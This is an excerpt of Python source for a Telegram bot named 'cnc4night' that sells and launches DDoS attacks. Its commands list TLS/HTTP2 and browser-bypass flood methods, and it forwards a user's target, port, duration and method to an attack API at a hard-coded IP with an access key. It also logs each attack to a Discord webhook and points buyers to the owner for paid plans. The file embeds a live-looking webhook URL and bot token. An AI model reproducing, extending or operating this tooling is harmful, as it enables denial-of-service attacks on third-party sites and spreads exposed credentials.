...
webhook_url = 'https://discord.com/api/webhooks/1098048865581670430/Lg6ea3BY2GwG0Uo7Ht_deiZLN6aWVuJmQUh_lezadRR4X1mnl2lbfS-3mPvTxzRO9K5E' # discord webhook here
TOKEN = '6171307436:AAHLyEQ0s7rGwz_ac5th0LHwhBLfXE0DRi4' # your bot token here
...
def handle_message(msg):
    ...
    if content_type == 'text':
        ...
        if text == '/help':
            ...
            bot.sendMessage(chat_id, 'List methods:\n- tls-destroy: tls bypass nosec\n- tls-vip: TLS/HTTP2 flood bypass\n- bypass: BROWSER bypass flood')
        elif text == '/info':
            bot.sendMessage(chat_id, 'cnc4night bot:\n\nOwner: @tcpsynn\nVersion: 3.2\nMax slots attack: N/A\nIf you want to buy plan. Contact @tcpsynn.')
        elif text == '/running':
            ...
            if int(duration) > max_duration:
                ...
                return
            url = f'http://103.82.27.238/attack.php?key=SiteStormA1&host={target}&port={port}&time={duration}&method={method}'
            ...
            if username:
                ...
                message = f"CNC 4 NIGHT BOT Attack Logs:\n==============================\nUsername: {username}\nTarget: {target}\nPort: {port}\nDuration: {duration}\nMethod: {method}\nDate: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nAttack slots: {attack_slots}/2"
